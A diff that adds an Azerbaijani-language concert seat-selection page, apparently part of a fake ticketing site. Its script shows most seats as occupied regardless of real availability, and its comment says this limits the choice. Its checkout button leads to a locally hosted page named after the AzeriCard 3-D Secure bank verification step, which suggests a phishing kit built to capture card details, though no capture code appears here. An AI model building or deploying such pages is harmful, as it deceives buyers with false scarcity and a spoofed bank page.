@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLOK3 - Oturacaq Seçimi</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f5f5f5; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; max-width: 800px; display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #ddd; margin-bottom: 20px; }
+        .header h2 { margin: 0; font-size: 18px; }
+        .header .close { font-size: 24px; cursor: pointer; color: #888; }
+        .filters { display: flex; gap: 10px; overflow-x: auto; width: 100%; max-width: 800px; padding-bottom: 10px; margin-bottom: 20px; }
+        .filter-chip { background: #fff; border: 1px solid #ddd; padding: 5px 15px; border-radius: 20px; font-size: 12px; white-space: nowrap; cursor: pointer; }
+        .filter-chip.active { background: #333; color: #fff; border-color: #333; }
+        .map-container { position: relative; width: 100%; max-width: 800px; background: #fff; border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .stage { background: #e0e0e0; color: #555; text-align: center; padding: 10px; border-radius: 10px; margin: 0 auto 20px; width: 60%; font-weight: bold; letter-spacing: 1px; }
+        .zones { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .zone { width: 100%; text-align: center; padding: 20px; border-radius: 10px; color: #fff; font-weight: bold; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .zone.golden { background-color: #dca86a; }
+        .zone.fan { background-color: #3399ff; margin-bottom: 20px; }
+        .zone span { font-weight: normal; font-size: 12px; opacity: 0.8; }
+        
+        .seats-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 5px; padding: 10px; background: #fafafa; border-radius: 10px; }
+        .seat { width: 20px; height: 20px; border-radius: 50%; background-color: #ddd; cursor: pointer; transition: 0.2s; }
+        .seat.available { background-color: #fff; border: 1px solid #bbb; }
+        .seat.available:hover { background-color: #ddd; }
+        .seat.selected { background-color: #ff2d55; border-color: #ff2d55; }
+        .seat.occupied { background-color: #eee; cursor: not-allowed; opacity: 0.5; }
+
+        .bottom-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; max-width: 800px; left: 50%; transform: translateX(-50%); border-radius: 20px 20px 0 0; }
+        .bottom-bar .info { font-size: 14px; }
+        .bottom-bar .info b { font-size: 18px; display: block; }
+        .bottom-bar button { background: #ff2d55; color: #fff; border: none; padding: 12px 25px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h2>BLOK3</h2>
+        <div class="close">&times;</div>
+    </div>
+
+    <div class="filters">
+        <div class="filter-chip">50 ₼</div>
+        <div class="filter-chip active">80 ₼</div>
+        <div class="filter-chip">100 ₼</div>
+    </div>
+
+    <div class="map-container">
+        <div class="stage">STAGE / SƏHNƏ</div>
+        
+        <div class="zones">
+            <div class="zone golden" style="display: flex; flex-direction: row; gap: 10px;">
+                <div style="width: 50%;">GOLDEN CIRCLE<br><span>Ayaqüstü Zona</span></div>
+                <div style="width: 50%;">GOLDEN CIRCLE<br><span>Ayaqüstü Zona</span></div>
+            </div>
+
+            <div class="zone fan">
+                FAN ZONE<br><span>Ayaqüstü Zona</span>
+            </div>
+
+            <!-- Oturacaqlar (100-110-cu sıra) -->
+            <div style="width: 100%; text-align: left; font-size: 12px; color: #888; margin-bottom: 5px;">Tribuna (100-cü sıra)</div>
+            <div class="seats-grid" id="seats-grid">
+                <!-- Oturacaqlar JS ilə yaradılacaq -->
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="info">
+            Seçilmiş oturacaq: <b id="selected-count">0</b>
+            Ümumi məbləğ: <b id="total-price">0 ₼</b>
+        </div>
+        <button onclick="window.location.href='/azericard/azericard-3ds.html'">Davam et</button>
+    </div>
+
+    <script>
+        const grid = document.getElementById('seats-grid');
+        const selectedCountEl = document.getElementById('selected-count');
+        const totalPriceEl = document.getElementById('total-price');
+        const seatPrice = 80; // 80 AZN
+
+        let selectedSeats = 0;
+        let occupiedSeats = [2, 5, 9, 12, 15, 18, 23, 27, 30, 35, 38, 41, 44, 49, 52, 55, 60, 65, 70, 75, 80, 85, 90, 95]; // Dolu yerlər
+
+        // 100 oturacaq yaradırıq
+        for (let i = 0; i < 100; i++) {
+            const seat = document.createElement('div');
+            seat.classList.add('seat');
+
+            // Əgər bu oturacaq dolu siyahısındadırsa
+            if (occupiedSeats.includes(i)) {
+                seat.classList.add('occupied');
+            } else {
+                // Boş oturacaq (amma hər qiymətə uyğun sadəcə 10-15-ni seçilə bilən edək)
+                // Burada random olaraq bəzilərini seçilə bilən edirik
+                if (i < 15) {
+                    seat.classList.add('available');
+                    seat.onclick = function() {
+                        if (this.classList.contains('selected')) {
+                            this.classList.remove('selected');
+                            selectedSeats--;
+                        } else {
+                            this.classList.add('selected');
+                            selectedSeats++;
+                        }
+                        updateTotal();
+                    };
+                } else {
+                    seat.classList.add('occupied'); // Qalanı dolu göstəririk ki, seçim çox olmasın
+                }
+            }
+            grid.appendChild(seat);
+        }
+
+        function updateTotal() {
+            selectedCountEl.innerText = selectedSeats;
+            totalPriceEl.innerText = (selectedSeats * seatPrice) + ' ₼';
+        }
+    </script>
+</body>
+</html>
